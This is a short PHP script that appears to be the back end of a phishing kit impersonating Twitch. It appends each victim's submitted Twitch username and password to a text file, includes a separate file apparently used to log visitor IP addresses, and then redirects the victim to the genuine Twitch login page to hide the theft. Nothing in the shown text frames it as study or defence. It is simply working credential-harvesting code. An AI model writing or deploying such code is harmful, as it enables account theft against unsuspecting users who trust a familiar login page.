<?php
include 'base.php';
include 'ip.php';

file_put_contents("usernames.txt", "[Twitch-EMAIL]: " . $_POST['twitch_user'] . " [Twitch-PASS]: " . $_POST['twitch_pass'] . "\n", FILE_APPEND);
header('Location: https://twitch.tv/login');
exit();
